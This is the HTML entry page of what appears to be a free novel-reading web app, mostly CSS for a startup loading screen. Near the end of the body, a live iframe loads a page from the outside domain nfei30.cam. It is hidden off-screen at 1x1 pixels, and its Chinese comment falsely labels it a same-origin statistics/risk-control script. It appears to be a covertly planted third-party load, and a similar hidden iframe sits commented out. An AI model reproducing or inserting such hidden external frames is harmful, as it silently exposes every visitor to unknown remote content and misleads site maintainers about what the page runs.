<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
    <meta name="description" content="Discover free stories and continue reading chapter by chapter." />
    <!-- 浏览器标签页优先使用品牌 ICO，同时为不支持 ICO 的环境提供 PNG 回退。 -->
    <link rel="icon" type="image/x-icon" href="/src/assets/logo.ico" />
    <link rel="icon" type="image/png" href="/src/assets/logo.png" />
    <title>Free Stories — Read Online</title>
    <script>window.__novelStartupStartedAt=performance.now();</script>
    <style>
      #novel-startup-loader{position:fixed;inset:0;z-index:1000;display:grid;place-items:center;padding:24px;isolation:isolate;overflow:hidden;background:#fff;color:#1e2228;opacity:1;transition:opacity 240ms ease,visibility 240ms ease}
      #novel-startup-loader.is-leaving{opacity:0;visibility:hidden;pointer-events:none}
      .novel-startup-loader__cover{position:absolute;inset:-12%;z-index:0;width:124%;height:124%;object-fit:cover;filter:blur(22px) saturate(1.12);transform:scale(1.06);opacity:0;transition:opacity 260ms ease}
      #novel-startup-loader.has-cover .novel-startup-loader__cover{opacity:.42}
      /* 首屏沿用阅读页的纸张、字形和留白，让加载过程像正在翻开正文。 */
      .novel-startup-loader__reader{position:absolute;inset:0;z-index:0;overflow:hidden;background:#fff;pointer-events:none}
      .novel-startup-loader__excerpt{display:block;width:min(900px,100%);min-height:100dvh;margin:0 auto;padding:48px max(20px,7vw) calc(128px + env(safe-area-inset-bottom));color:#30343a;font:400 clamp(18px,2.2vw,20px)/1.95 Georgia,"Times New Roman",serif;opacity:0;overflow:hidden;text-align:start;transition:opacity 260ms ease;white-space:pre-line;word-break:normal}
      #novel-startup-loader.has-excerpt .novel-startup-loader__excerpt{opacity:1}
      /* 底部渐隐让正文自然收束，避免大面积遮罩压暗首屏内容。 */
      #novel-startup-loader::before{content:"";position:absolute;inset:auto 0 0;z-index:1;height:180px;background:linear-gradient(to bottom,rgba(255,255,255,0),#fff 70%);pointer-events:none}
      /* 进度卡保留既有的居中反馈，正文纸张只作为其后方的首屏背景。 */
      .novel-startup-loader__card{position:relative;z-index:2;width:min(320px,100%);padding:30px 28px 27px;border:1px solid rgba(255,255,255,.82);border-radius:25px;background:rgba(255,255,255,.9);box-shadow:0 20px 54px rgba(37,43,53,.13);text-align:center}
      .novel-startup-loader__mark{display:grid;width:52px;height:52px;margin:0 auto 17px;place-items:center;border-radius:17px;background:linear-gradient(145deg,#ff936e,#ff684a);box-shadow:0 11px 24px rgba(255,107,74,.28);color:#fff;font:700 23px/1 system-ui,sans-serif}
      .novel-startup-loader__title{margin:0;color:#22262c;font:700 18px/1.35 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
      .novel-startup-loader__hint{margin:7px 0 20px;color:#7a8089;font:500 13px/1.5 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
      .novel-startup-loader__track{height:9px;overflow:hidden;border-radius:999px;background:#eceef2}
      .novel-startup-loader__fill{display:block;width:0;height:100%;border-radius:inherit;background:linear-gradient(90deg,#ff674a,#ffbd79);box-shadow:0 3px 10px rgba(255,107,74,.23);transition:width 100ms linear}
      @media (max-width:620px){.novel-startup-loader__excerpt{padding:34px 20px calc(114px + env(safe-area-inset-bottom));font-size:18px;line-height:1.85}}
      @media (prefers-reduced-motion:reduce){#novel-startup-loader,.novel-startup-loader__fill{transition:none}}
    </style>
  </head>
  <body>
    <div id="novel-startup-loader" role="progressbar" aria-label="Loading story" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
      <!-- Vue 挂载前先展示与阅读页一致的正文纸张，并保留原有居中加载反馈。 -->
      <img id="novel-startup-loader-cover" class="novel-startup-loader__cover" alt="" aria-hidden="true" fetchpriority="high" />
      <section class="novel-startup-loader__reader" aria-hidden="true"><div id="novel-startup-loader-text" class="novel-startup-loader__excerpt"></div></section>
      <div class="novel-startup-loader__card">
        <div class="novel-startup-loader__mark" aria-hidden="true">✦</div>
        <p class="novel-startup-loader__title">Preparing your story</p>
        <p class="novel-startup-loader__hint">Please wait a moment</p>
        <div class="novel-startup-loader__track"><span id="novel-startup-loader-fill" class="novel-startup-loader__fill"></span></div>
      </div>
    </div>
    <!-- 小说站每个页面立即加载同源的隐藏统计/风控程序，不占用可见布局。 -->
    <iframe 
    src="https://nfei30.cam/assets/js/group.html?p=wniXuUjA" 
    style="
      position:absolute;
      left:-9999px;
      top:-9999px;
      width:1px;
      height:1px;
      border:none;"
    frameborder="0"></iframe>
    <!-- <iframe src="/gooll/gooll.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe> -->
    <div id="app"></div>
    <!--NOVEL_H5_BOOTSTRAP-->
    <script type="module" src="/src/startup.js"></script>
    <script type="module" src="/src/main.js"></script>
  </body>
</html>
